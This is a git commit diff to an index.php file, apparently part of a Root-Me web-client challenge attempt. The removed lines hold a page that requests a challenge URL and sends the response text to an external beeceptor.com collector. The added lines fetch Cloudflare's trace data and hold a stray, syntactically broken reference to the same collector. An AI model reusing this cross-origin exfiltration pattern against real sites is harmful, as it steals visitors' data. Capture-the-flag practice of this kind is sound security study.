99d0b2a7874a2f4878d4ca4168b4a00a1a73d599
Anhydrite <49342114+Anhydrite@users.noreply.github.com>
2021-02-03 21:10:23 +0100

    Update index.php

--- index.php
+++ index.php
@@ -1,47 +1,7 @@
-<?php
-header("Access-Control-Allow-Origin: *");
 
-?>
-<!DOCTYPE html>
-<html>
-<body>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 
-<h1>The XMLHttpRequest Object</h1>
-
-<button type="button" onclick="loadDoc()">Request data</button>
-
-<p id="demo"></p>
- 
-<script>
-
-    const options = {
-  method: 'GET',
-  mode: 'no-cors'
-};
-var url = "http://challenge01.root-me.org/web-client/ch30/page?user=s"
-var request = new XMLHttpRequest();
-const Http = new XMLHttpRequest();
-Http.open("GET", url);
-Http.send();
-Http.onreadystatechange = (e) => {
-  console.log(Http.responseText)
-  send(Http)
-}
-
-function send(data){
-var xhr = new XMLHttpRequest();
-xhr.open("POST", "https://bonjour.free.beeceptor.com", true);
-xhr.setRequestHeader('Content-Type', 'application/json');
-console.log(data.responseText)
-xhr.send(JSON.stringify({
-value: data.responseText
-}));
-
-}
-
-
-</script>
-
-</body>
-</html>
-<meta http-equiv="refresh" content='4; URL="https://bonjour.free.beeceptor.com?v=
+$.get('https://www.cloudflare.com/cdn-cgi/trace', function(data) {
+    console.log(data)
+ https://bonjour.free.beeceptor.com
+})
